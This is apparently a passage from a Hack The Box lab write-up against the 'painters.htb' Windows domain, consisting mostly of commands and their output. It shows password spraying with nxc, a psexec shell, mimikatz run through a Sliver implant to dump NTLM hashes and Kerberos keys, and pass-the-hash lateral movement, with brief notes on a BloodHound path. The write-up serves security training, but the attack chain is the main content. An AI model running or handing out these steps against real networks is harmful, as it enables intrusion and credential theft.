
```
kali@kali ~> nxc smb 192.168.110.0/24 -u 'web_svc' -p '!QAZ1qaz'
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:False)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)
```



```
kali@kali ~> psexec.py painters.htb/web_svc:!QAZ1qaz@192.168.110.52
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.110.52.....
[*] Found writable share ADMIN$
[*] Uploading file YBerJnik.exe
[*] Opening SVCManager on 192.168.110.52.....
[*] Creating service MXap on 192.168.110.52.....
[*] Starting service MXap.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```



https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49


```
sliver (ABOVE_FREEZER) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "lsadump::sam"  "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : PNT-SVRSVC
SysKey : b131ea5c8206a94e3d32119d035961a9
Local SID : S-1-5-21-1894836871-1209905952-3336604744

SAMKey : 21027b48a361fb0094c6eb79509e228d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6ee87fa6593a4798fe651f5f5a4e663e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a3896a66cc19131b074f0463d56587c

* Primary:Kerberos-Newer-Keys *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e2638a592bf8df16ae7a16d5f1e0ff945af694ea1cb0c96cc718f30371677dd7
      aes128_hmac       (4096) : 3e2a98999ef9cef8c1e41928257487c9
      des_cbc_md5       (4096) : fb64f42680042c52
    OldCredentials
      aes256_hmac       (4096) : 5c0ecc5dccd087cac3ec672f714c2119ab655a9f0b6b51bf75da22179dfee76a
      aes128_hmac       (4096) : d6477c485507bb6f1454cedc0af950f6
      des_cbc_md5       (4096) : ab7fe0ece5b67c5d
    OlderCredentials
      aes256_hmac       (4096) : cb7a55cfd2a867b40baa0f8148f327afce1b1b70e07a49ceecb33d3b379d42ce
      aes128_hmac       (4096) : da4f9d36f93e1c0af67f8af0805ff692
      des_cbc_md5       (4096) : e3fb1c49927a891c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Credentials
      des_cbc_md5       : fb64f42680042c52
    OldCredentials
      des_cbc_md5       : ab7fe0ece5b67c5d


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : James
  Hash NTLM: 8af1903d3c80d3552a84b6ba296db2ea

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e159b53fdb4574ab6bed0660156ffcc6

* Primary:Kerberos-Newer-Keys *
    Default Salt : SVC.PAINTERS.HTBJames
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ab256c5e77a17fc0234eeada495d8ea573b2c3e90d9e5d24d2dba7d4e9792c23
      aes128_hmac       (4096) : 8d68c286c5716ed9213092b1281f24c5
      des_cbc_md5       (4096) : 1f54a21c86cbd6ef

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : SVC.PAINTERS.HTBJames
    Credentials
      des_cbc_md5       : 1f54a21c86cbd6ef


mimikatz(commandline) # exit
Bye!

```

now we have james's hash


```
kali@kali ~> nxc smb 192.168.110.0/24 -u 'James' -H '8af1903d3c80d3552a84b6ba296db2ea' --local-auth
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:PNT-SVRSVC) (signing:False) (SMBv1:False)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [-] PNT-SVRSVC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_PASSWORD_EXPIRED
SMB         192.168.110.55  445    DC               [-] DC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:PNT-SVRBPA) (signing:False) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
SMB         192.168.110.53  445    PNT-SVRBPA       Node PNT-SVRBPA.PAINTERS.HTB successfully set as owned in BloodHound
```

lets not forget the bloodbound path, we can recall that **PNT-SVRBPA** has outbound control over blake. so now lets move over to 192.168.110.53